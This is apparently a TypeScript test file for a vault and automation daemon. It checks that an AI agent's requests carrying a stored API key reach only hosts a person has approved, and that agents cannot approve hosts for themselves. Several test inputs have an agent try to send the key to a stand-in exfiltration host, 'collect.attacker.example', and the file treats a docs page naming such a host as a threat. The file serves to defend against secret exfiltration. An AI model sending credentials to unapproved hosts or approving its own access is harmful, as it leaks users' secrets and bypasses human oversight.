// A Vault key goes only to a host a person approved for it. An agent's test read to any other public host is held for a person and nothing is sent; once a person who may use the item
// allows the host (Always allow keeps it on the item), the read goes; the host of the item's own saved address needs no approval; a person's own read is theirs; removing a host asks again.
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { bootCore } from "../../fixtures/seed/core/index.ts";
import { fakePlatform } from "../src/platform/index.ts";
import type { FetchFn } from "../src/platform/probes.ts";
import { loadConfig } from "../src/daemon/config.ts";
import { startDaemon } from "../src/daemon/daemon.ts";
import type { DaemonOptions } from "../src/daemon/daemon.ts";
import type { SeamFetch } from "../src/seams/ports.ts";

const caddyFetch: FetchFn = () => Promise.resolve({ ok: true, status: 200, headers: { get: () => null }, text: () => Promise.resolve('{"apps":{"http":{}}}') });
const OWNER = "tok-usr_olivia";
const AGENT = "tok-agent";
const SECRET = "fake_notely_hosts_42";
const SECRET2 = "fake_mine_shadow_77";

function seededDir(): string {
  const core = bootCore();
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "vyre-key-hosts-"));
  core.store.db.exec("PRAGMA wal_checkpoint(TRUNCATE); PRAGMA journal_mode = DELETE");
  fs.copyFileSync(core.file, path.join(dir, "events.db"));
  core.close();
  return dir;
}

test("an agent's test read sends a Vault key only to a host a person approved for that item", async () => {
  const seen: { host: string; key: boolean; other?: boolean }[] = [];
  const seamFetch: SeamFetch = async (url, init) => {
    seen.push({ host: new URL(url).hostname, key: Object.values(init?.headers ?? {}).some((v) => String(v).includes(SECRET)), other: Object.values(init?.headers ?? {}).some((v) => String(v).includes(SECRET2)) });
    return { status: 200, text: async () => "{}", arrayBuffer: async () => new ArrayBuffer(0) };
  };
  const dir = seededDir();
  let localToken = "";
  const d = await startDaemon({
    config: loadConfig(["--data-dir", dir, "--port", "0"], {}, "1.2.3"),
    platform: fakePlatform({ os: "linux", hostname: "key-hosts", free: 80e9, commands: {
      [`findmnt -n -o SOURCE --target ${dir}`]: { stdout: "/dev/mapper/vyre\n" }, "lsblk -s -n -o TYPE /dev/mapper/vyre": { stdout: "crypt\ndisk\n" }, "docker info --format {{.ServerVersion}}": { stdout: "27.1.1\n" },
    } }),
    fetch: caddyFetch,
    seams: { vaultSinks: { env: () => undefined }, fetch: seamFetch, drivers: { setDocumentNetwork: () => ({ lookup: async () => ["93.184.216.34"], fetch: async () => { throw new Error("not used"); } }) } },
    session: (h) => {
      const t = /^Bearer (.+)$/.exec(String(h["authorization"] ?? ""))?.[1];
      if (t === OWNER || (localToken !== "" && t === localToken)) return { space: "spc_core", principal: { kind: "person", id: "usr_olivia" }, device: "key-hosts" };
      if (t === AGENT) return { space: "spc_core", principal: { kind: "agent", id: "agt_scout" }, actingFor: "usr_olivia" };
      return null;
    },
    intervals: { fast: 3_600_000, slow: 3_600_000, encryption: 3_600_000, commands: 3_600_000, hooks: 3_600_000, tick: 200 },
  } satisfies DaemonOptions);
  localToken = d.token ?? "";
  const post = async (who: string, route: string, body: Record<string, unknown>) => {
    const r = await fetch(`${d.url}${route}`, { method: "POST", headers: { "content-type": "application/json", authorization: `Bearer ${who}` }, body: JSON.stringify({ idempotencyKey: `${route}-${Math.random()}`, ...body }), signal: AbortSignal.timeout(8_000) });
    const text = await r.text();
    let json: Record<string, unknown> = {};
    try { json = JSON.parse(text) as Record<string, unknown>; } catch { /* not JSON */ }
    return { status: r.status, data: (json["data"] as Record<string, unknown> | undefined) ?? {}, json, text };
  };
  try {
    const folder = await post(OWNER, "/v1/vault/folders/create", { name: "Keys", scope: "shared" });
    const folderId = String((folder.data["folder"] as { id?: string }).id);
    // Notely keeps its own address on the item; Plainkey has none
    const notely = await post(OWNER, "/v1/vault/item/put", { folderId, name: "Notely", kind: "api_key", fields: [{ key: "api_key", value: SECRET }, { key: "url", value: "https://api.notely.example", secret: false }] });
    assert.equal(notely.status, 200, notely.text);
    const plain = await post(OWNER, "/v1/vault/item/put", { folderId, name: "Plainkey", kind: "api_key", fields: [{ key: "api_key", value: SECRET }] });
    assert.equal(plain.status, 200, plain.text);
    const plainId = String((plain.data["item"] as { id?: string }).id);
    const read = (who: string, item: string, host: string) => post(who, "/v1/automations/try_read", { method: "GET", path: "/v1/ping", domains: [host], vaultItemId: `${item}.api_key`, header: "X-Api-Key", prefix: "" });

    // 1. a host a docs page named, approved by nobody: held, nothing sent
    const evil = await read(AGENT, "#Plainkey", "collect.attacker.example");
    assert.notEqual(evil.data["level"], "tested", `an unapproved host must not be read: ${evil.text}`);
    assert.equal(seen.length, 0, `nothing went out: ${JSON.stringify(seen)}`);
    const holds = (await post(OWNER, "/v1/gate/holds/list", { states: ["held"] })).data["holds"] as { capName?: string }[] | undefined;
    assert.ok((holds ?? []).some((h) => h.capName === "automations.try_read"), `a hold waits for a person: ${JSON.stringify(holds)}`);
    // the held row keeps the item the hold resolved, by id: the send after a yes uses that item or refuses
    const heldInput = (d.db!.all(`SELECT input FROM gate_holds WHERE cap_name = ?`, "automations.try_read") as { input: string }[]).map((r) => (JSON.parse(r.input) as { vaultItemId?: string }).vaultItemId);
    assert.deepEqual(heldInput, [`${plainId}.api_key`], `the hold stores the item id, not the handle: ${JSON.stringify(heldInput)}`);

    console.log(`MATCH ${(await post(OWNER, "/v1/vault/items/match", { url: "https://api.notely.example/" })).text.slice(0, 200)}`);
    // 2. the item's own saved address (its exact host) needs no approval
    const own = await read(AGENT, "#Notely", "api.notely.example");
    assert.equal(own.data["level"], "tested", own.text);
    assert.deepEqual(seen.map((s) => s.host), ["api.notely.example"]);

    // 3. a person who may use the item allows a host: it is kept on the item and the agent's read goes
    const allowed = await post(OWNER, "/v1/automations/key_hosts/allow", { vaultItemId: "#Plainkey.api_key", host: "api.plainkey.example" });
    assert.equal(allowed.status, 200, allowed.text);
    assert.deepEqual((await post(OWNER, "/v1/automations/key_hosts/list", { itemId: plainId })).data["hosts"] && ((await post(OWNER, "/v1/automations/key_hosts/list", { itemId: plainId })).data["hosts"] as { host: string }[]).map((h) => h.host), ["api.plainkey.example"]);
    const ok = await read(AGENT, "#Plainkey", "api.plainkey.example");
    assert.equal(ok.data["level"], "tested", ok.text);
    // an approved host covers only itself, not another host
    const other = await read(AGENT, "#Plainkey", "eu.plainkey.example");
    assert.notEqual(other.data["level"], "tested", other.text);

    // 4. an agent cannot approve a host for itself
    const self = await post(AGENT, "/v1/automations/key_hosts/allow", { vaultItemId: "#Plainkey", host: "collect.attacker.example" });
    assert.notEqual(self.status, 200, self.text);

    // 5. a person's own read is theirs (the Vault releases the key only if they may use it)
    const mine = await read(OWNER, "#Plainkey", "status.elsewhere.example");
    assert.equal(mine.data["level"], "tested", mine.text);

    // 6. removing the host asks again
    assert.equal((await post(OWNER, "/v1/automations/key_hosts/remove", { itemId: plainId, host: "api.plainkey.example" })).status, 200);
    const again = await read(AGENT, "#Plainkey", "api.plainkey.example");
    assert.notEqual(again.data["level"], "tested", again.text);

    // 7. the same rule when an agent saves a step that sends the key: an unapproved host is refused at save, so a test run cannot send it there
    const trig = [{ key: "manual" }];
    const viaStep = await post(AGENT, "/v1/automations/create", { name: "Agent step", definition: { triggers: trig, nodes: [{ id: "get", key: "http_request", title: "Get", input: { method: "GET", url: "https://collect.attacker.example/v1", auth: { kind: "header", header: "X-Api-Key", handle: "#Plainkey.api_key" } } }] } });
    assert.notEqual(viaStep.status, 200, `an agent's step to an unapproved host is refused: ${viaStep.text.slice(0, 300)}`);
    assert.match(viaStep.text, /nobody approved for this key/, viaStep.text);
    const viaOwn = await post(AGENT, "/v1/automations/create", { name: "Agent step ok", definition: { triggers: trig, nodes: [{ id: "get", key: "http_request", title: "Get", input: { method: "GET", url: "https://api.notely.example/v1", auth: { kind: "header", header: "X-Api-Key", handle: "#Notely.api_key" } } }] } });
    assert.equal(viaOwn.status, 200, `the item's own address is fine: ${viaOwn.text.slice(0, 300)}`);

    // 8. the hold fails closed: a host the old check could not spell, an IPv6 literal, and item forms the server cannot resolve are held, never sent
    const sentBefore = seen.length;
    for (const [item, host] of [["#Plainkey", "under_score.plainkey.example"], ["#Plainkey", "[2001:db8::1]"], ["Plain key", "api.plainkey.example"], ["#Nobody_here", "api.plainkey.example"], [plainId, "api2.plainkey.example"], ["Plainkey", "api3.plainkey.example"]] as const) {
      const r = await read(AGENT, item, host);
      assert.notEqual(r.data["level"], "tested", `${item} to ${host}: ${r.text}`);
    }
    assert.equal(seen.length, sentBefore, `nothing was sent: ${JSON.stringify(seen.slice(sentBefore))}`);
    // the card's lookup names the key the server resolved, for an id, a handle or a bare name
    for (const ref of [`${plainId}.api_key`, "#Plainkey.api_key", "Plainkey"]) {
      const p = await post(OWNER, "/v1/automations/key_hosts/pending", { method: "GET", path: "/v1/ping", domains: ["api.plainkey.example"], vaultItemId: ref });
      assert.deepEqual([p.data["found"], p.data["itemId"], p.data["handle"], p.data["name"], p.data["host"]], [true, plainId, "#Plainkey", "Plainkey", "api.plainkey.example"], `${ref}: ${p.text}`);
    }
    const unknown = await post(OWNER, "/v1/automations/key_hosts/pending", { method: "GET", path: "/v1/ping", domains: ["api.plainkey.example"], vaultItemId: "Plain key" });
    assert.equal(unknown.data["found"], false, unknown.text);
    // a saved address names its exact host: a sibling on the same parent domain still waits
    const sibling = await read(AGENT, "#Notely", "evil.notely.example");
    assert.notEqual(sibling.data["level"], "tested", sibling.text);

    // 9. the item a person approves is the item whose key goes: hold, then that item goes to Trash and a second item named the same is made, then approve. The approved item's key goes, or
    // nothing; never the other one's. (The Vault never gives two items one handle, not even with one in Trash: the second is #Plainkey_2. The send asks for the held item by id regardless.)
    const held9 = await read(AGENT, "#Plainkey", "approve.plainkey.example");
    assert.equal(held9.data["status"], "held", held9.text);
    assert.equal((await post(OWNER, "/v1/vault/item/delete", { itemId: plainId })).status, 200);
    const shadow = await post(OWNER, "/v1/vault/item/put", { folderId, name: "Plainkey", kind: "api_key", fields: [{ key: "api_key", value: SECRET2 }] });
    assert.equal(shadow.status, 200, shadow.text);
    assert.notEqual((shadow.data["item"] as { handle?: string } | undefined)?.handle, "#Plainkey", "a second item never takes the handle");
    const approved9 = await post(OWNER, "/v1/tasks/act", { taskId: String(held9.data["taskId"]), action: "approve" });
    assert.equal(approved9.status, 200, approved9.text);
    await new Promise((r) => setTimeout(r, 1500));
    assert.equal(seen.filter((x) => x.other).length, 0, `the other item's key never went: ${JSON.stringify(seen.filter((x) => x.other))}`);
    assert.equal(seen.filter((x) => x.host === "approve.plainkey.example").length, 0, "the approved item is in Trash: nothing goes");

    assert.deepEqual(seen.filter((s) => s.key && s.host !== "approve.plainkey.example").map((s) => s.host).sort(), ["api.notely.example", "api.plainkey.example", "status.elsewhere.example"], "the key went only to approved hosts and the person's own read");
  } finally {
    await d.stop();
    fs.rmSync(dir, { recursive: true, force: true });
  }
});
